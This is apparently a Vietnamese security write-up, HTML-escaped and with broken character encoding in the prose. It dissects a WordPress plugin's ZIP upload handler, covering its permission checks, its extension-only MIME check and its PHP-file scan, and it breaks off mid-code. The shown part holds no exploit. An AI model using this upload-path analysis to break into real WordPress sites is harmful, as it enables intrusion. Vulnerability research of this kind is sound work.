nh·∫≠p&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_articulate_upload_file&amp;#39;, &amp;#39;articulate_upload_ajax_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=articulate_upload_file&lt;/code&gt; th√¨ callback &lt;code&gt;articulate_upload_ajax_file&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_upload_ajax_file() {&#xA;&#x9;articulate_setup_php_ini();&#xA;&#x9;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&#xA;&#xA;&#x9;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __( &amp;#39;You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$count_dirs = getDirs();&#xA;&#x9;// you can use WP&amp;#39;s wp_handle_upload() function:&#xA;&#x9;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;&#x9;$dir  = untrailingslashit( getUploadsPath() );&#xA;&#xA;&#x9;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to move uploaded file.  Please check if the folder has write permissions.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;&#x9;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;&#x9;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;&#x9;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&#xA;&#x9;// Open temp file&#xA;&#x9;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;&#x9;if ( $out ) {&#xA;&#x9;&#x9;// Read binary input stream and append it to temp file&#xA;&#x9;&#x9;$in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;&#x9;&#x9;if ( $in ) {&#xA;&#x9;&#x9;&#x9;while ( $buff = fread( $in, 4096 ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;fwrite( $out, $buff );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open input stream. Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;@fclose( $in );&#xA;&#x9;&#x9;@fclose( $out );&#xA;&#x9;&#x9;@unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open output stream.  Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Security check.&#xA;&#x9;$mime  = wp_check_filetype( $filePath );&#xA;&#x9;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;&#x9;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Check if file has been uploaded&#xA;&#x9;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;&#x9;&#x9;// Strip the temp .part suffix off&#xA;&#x9;&#x9;articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;&#x9;&#x9;// start extracting&#xA;&#x9;&#x9;// unzip file&#xA;&#x9;&#x9;$dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;&#x9;&#x9;$dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;&#x9;&#x9;$target = getUploadsPath() . $dir[0];&#xA;&#x9;&#x9;$file   = $filePath;&#xA;&#x9;&#x9;while ( file_exists( $target ) ) {&#xA;&#x9;&#x9;&#x9;$r       = rand( 1, 10 );&#xA;&#x9;&#x9;&#x9;$target .= $r;&#xA;&#x9;&#x9;&#x9;$dir[0] .= $r;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$arr = extractZip( $file, $target, $dir[0] );&#xA;&#x9;&#x9;unlink( $filePath );&#xA;&#x9;&#x9;do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;&#x9;&#x9;$ok       = isset( $arr[4] ) ? $arr[4] : 0;&#xA;&#x9;&#x9;$response = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;     =&amp;gt; $ok,&#xA;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39;   =&amp;gt; $arr[0],&#xA;&#x9;&#x9;&#x9;&amp;#39;folder&amp;#39; =&amp;gt; $arr[2],&#xA;&#x9;&#x9;&#x9;&amp;#39;path&amp;#39;   =&amp;gt; $arr[1],&#xA;&#x9;&#x9;&#x9;&amp;#39;name&amp;#39;   =&amp;gt; $arr[3],&#xA;&#x9;&#x9;&#x9;&amp;#39;target&amp;#39; =&amp;gt; $target,&#xA;&#x9;&#x9;);&#xA;&#x9;&#x9;die( json_encode( $response ) );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 1,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Uploading chunks!&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;exit;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;articulate_upload_ajax_file()&lt;/code&gt; x·ª≠ l√Ω upload file qua AJAX cho plugin. C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kh·ªüi t·∫°o &amp;amp; b·∫£o m·∫≠t c∆° b·∫£n&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;articulate_setup_php_ini();&#xA;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_setup_php_ini()&lt;/code&gt; ‚Äî ch·ªânh c√°c setting PHP (th∆∞·ªùng ƒë·ªÉ cho ph√©p upload l·ªõn h∆°n, timeout&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer()&lt;/code&gt; ‚Äî ki·ªÉm tra nonce ƒë·ªÉ ngƒÉn CSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ch·ªâ cho user ƒë√£ ƒëƒÉng nh·∫≠p v√† c√≥ capability &lt;code&gt;upload_files&lt;/code&gt; v√† &lt;code&gt;unfiltered_html&lt;/code&gt; th·ª±c hi·ªán upload (Editor tr·ªü l√™n).&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng ƒë·ªß quy·ªÅn, tr·∫£ v·ªÅ JSON l·ªói v√† d·ª´ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;L·∫•y th√¥ng tin file v√† ƒë∆∞·ªùng d·∫´n l∆∞u&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$count_dirs = getDirs();&#xA;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;$dir  = untrailingslashit( getUploadsPath() );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$_FILES[&#39;async-upload&#39;]&lt;/code&gt; l√† file upload t·ª´ client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getUploadsPath()&lt;/code&gt; tr·∫£ v·ªÅ th∆∞ m·ª•c g·ªëc ƒë·ªÉ l∆∞u (custom c·ªßa plugin); &lt;code&gt;untrailingslashit()&lt;/code&gt; b·ªè d·∫•u &lt;code&gt;/&lt;/code&gt; cu·ªëi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra l·ªói upload ban ƒë·∫ßu&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ file ho·∫∑c c√≥ l·ªói (upload error code), tr·∫£ v·ªÅ l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;X·ª≠ l√Ω chunked upload v√† ƒë·∫∑t t√™n file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;H·ªó tr·ª£ upload theo m·∫£nh (chunked). &lt;code&gt;chunk&lt;/code&gt; l√† index hi·ªán t·∫°i, &lt;code&gt;chunks&lt;/code&gt; t·ªïng s·ªë m·∫£nh.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt; l√†m s·∫°ch t√™n file ƒë·ªÉ tr√°nh k√Ω t·ª± nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filePath&lt;/code&gt; l√† ƒë∆∞·ªùng d·∫´n file ƒë√≠ch (trong th∆∞ m·ª•c upload c·ªßa plugin).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;M·ªü file &lt;code&gt;.part&lt;/code&gt; v√† ghi d·ªØ li·ªáu (append ho·∫∑c write)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;if ( $out ) {&#xA;    $in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;    if ( $in ) {&#xA;        while ( $buff = fread( $in, 4096 ) ) {&#xA;            fwrite( $out, $buff );&#xA;        }&#xA;    } else { die(...); }&#xA;    @fclose( $in );&#xA;    @fclose( $out );&#xA;    @unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;} else { die(...); }&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;M·ªü file t·∫°m &lt;code&gt;{$filePath}.part&lt;/code&gt;: n·∫øu &lt;code&gt;chunk == 0&lt;/code&gt; m·ªü ƒë·ªÉ ghi m·ªõi (&lt;code&gt;wb&lt;/code&gt;), c√≤n n·∫øu l√† chunk ti·∫øp theo m·ªü append (&lt;code&gt;ab&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;ƒê·ªçc file t·∫°m PHP (&lt;code&gt;tmp_name&lt;/code&gt;) v√† ghi v√†o file &lt;code&gt;.part&lt;/code&gt; theo t·ª´ng block 4096 bytes.&lt;/li&gt;&#xA;&lt;li&gt;Sau ghi, ƒë√≥ng file v√† x√≥a file t·∫°m c·ªßa PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra MIME/type theo file extension&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$mime  = wp_check_filetype( $filePath );&#xA;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_check_filetype( $filePath )&lt;/code&gt; d·ª±a tr√™n t√™n/ƒëu√¥i file ƒë·ªÉ tr·∫£ v·ªÅ MIME (kh√¥ng ki·ªÉm tra n·ªôi dung nh·ªã ph√¢n).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;get_allowed_mime_types( $user_id )&lt;/code&gt; tr·∫£ v·ªÅ danh s√°ch MIME ƒë∆∞·ª£c ph√©p cho user hi·ªán t·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu MIME kh√¥ng n·∫±m trong danh s√°ch cho ph√©p th√¨ tr·∫£ v·ªÅ l·ªói b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;Khi t·∫•t c·∫£ chunk ƒë√£ ƒë∆∞·ª£c upload (ho√†n t·∫•t)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;    articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;    $dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;    $dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;    $target = getUploadsPath() . $dir[0];&#xA;    $file   = $filePath;&#xA;    while ( file_exists( $target ) ) {&#xA;        $r       = rand( 1, 10 );&#xA;        $target .= $r;&#xA;        $dir[0] .= $r;&#xA;    }&#xA;    $arr = extractZip( $file, $target, $dir[0] );&#xA;    unlink( $filePath );&#xA;    do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;    ...&#xA;    die( json_encode( $response ) );&#xA;} else {&#xA;    die(json_encode([&amp;#39;OK&amp;#39;=&amp;gt;1,&amp;#39;info&amp;#39;=&amp;gt;&amp;#39;Uploading chunks!&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng d√πng chunking ho·∫∑c chunk hi·ªán t·∫°i l√† chunk cu·ªëi c√πng th√¨:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_custom_rename()&lt;/code&gt; ƒë·ªïi t√™n file &lt;code&gt;.part&lt;/code&gt; -&amp;gt; file th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Chu·∫©n b·ªã &lt;code&gt;target&lt;/code&gt; (folder) d·ª±a tr√™n t√™n file (ph·∫ßn tr∆∞·ªõc d·∫•u &lt;code&gt;.&lt;/code&gt;) ‚Äî d√πng l√†m th∆∞ m·ª•c gi·∫£i n√©n.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;target&lt;/code&gt; ƒë√£ t·ªìn t·∫°i th√¨ n·ªëi s·ªë ng·∫´u nhi√™n ƒë·ªÉ tr√°nh ghi ƒë√®.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;extractZip($file, $target, $dir[0])&lt;/code&gt; ƒë·ªÉ gi·∫£i n√©n file v√†o &lt;code&gt;target&lt;/code&gt;. (H√†m n√†y c√≥ th·ªÉ x·ª≠ l√Ω ZIP; logic t√πy plugin.)&lt;/li&gt;&#xA;&lt;li&gt;X√≥a file zip g·ªëc b·∫±ng &lt;code&gt;unlink($filePath)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi hook &lt;code&gt;iea/uploaded_quiz&lt;/code&gt; ƒë·ªÉ plugin/third-party x·ª≠ l√Ω ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ JSON ph·∫£n h·ªìi v·ªõi c√°c th√¥ng tin (OK, folder, path, name, target).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu v·∫´n c√≤n chunk ƒëang upload th√¨ tr·∫£ v·ªÅ JSON th√¥ng b√°o ƒëang upload.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;function extractZip( $fileName, $target, $dir ) {&#xA;&#x9;add_filter( &amp;#39;admin_memory_limit&amp;#39;, &amp;#39;articulate_run_admin_memory_limit_hook&amp;#39;, 100, 1 );&#xA;&#x9;// admin_memory_limit hook is called in wp_raise_memory_limit function that is called in unzip_file function.&#xA;&#x9;$arr      = array();&#xA;&#x9;$unzipper = new Quiz_Unzip( true );&#xA;&#x9;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&#xA;&#xA;&#x9;if ( $unzip ) {&#xA;&#x9;&#x9;wp_ajax_quiz_check_folder( $target );&#xA;&#x9;&#x9;if ( articulate_has_php_file( $target ) ) {&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we found a PHP file that is not allowed in your content directory. Contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;$arr[1] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;} else {&#xA;&#xA;&#x9;&#x9;&#x9;$file   = getFile( $target, true );// true to get return value as an array of detail&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;Upload Complete!&amp;#39;;&#xA;&#x9;&#x9;&#x9;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;index_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;other_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = __( &amp;#39;Upload Complete!&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 1;// OK = 1&#xA;&#x9;&#x9;&#x9;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:black&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we were unable to find an HTML file. Either increase your WP_MEMORY_LIMIT, define your FS_METHOD as DIRECT, or contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = $file;&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;$arr[0] = __( &amp;#39;File upload failed&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;}&#xA;&#x9;return $arr;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;extractZip()&lt;/code&gt; x·ª≠ l√Ω &lt;strong&gt;gi·∫£i n√©n file ZIP&lt;/strong&gt; sau khi ng∆∞·ªùi d√πng upload, ƒë·ªìng th·ªùi &lt;strong&gt;ki·ªÉm tra an to√†n&lt;/strong&gt; (c·ª• th·ªÉ l√† kh√¥ng ch·ª©a file PHP, PHTML, PHAR), v√† tr·∫£ v·ªÅ th√¥ng tin k·∫øt qu·∫£ d·∫°ng m·∫£ng &lt;code&gt;$arr&lt;/code&gt;. C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán gi·∫£i n√©n&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unzipper = new Quiz_Unzip( true );&#xA;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;T·∫°o ƒë·ªëi t∆∞·ª£ng &lt;code&gt;Quiz_Unzip&lt;/code&gt; (c√≥ th·ªÉ l√† wrapper quanh &lt;code&gt;unzip_file()&lt;/code&gt; c·ªßa WordPress).&lt;/li&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán gi·∫£i n√©n &lt;code&gt;$fileName&lt;/code&gt; v√†o th∆∞ m·ª•c &lt;code&gt;$target&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$unzip&lt;/code&gt; tr·∫£ v·ªÅ &lt;strong&gt;true&lt;/strong&gt; n·∫øu gi·∫£i n√©n th√†nh c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra c√≥ file PHP nguy hi·ªÉm kh√¥ng&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( articulate_has_php_file( $target ) ) {&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;G·ªçi h√†m &lt;code&gt;articulate_has_php_file()&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;qu√©t to√†n b·ªô th∆∞ m·ª•c gi·∫£i n√©n&lt;/strong&gt; xem c√≥ ch·ª©a file &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt; hay kh√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_has_php_file( $dir ) {&#xA;    $dir = rtrim( $dir, &amp;#39;/&amp;#39; );&#xA;    if ( 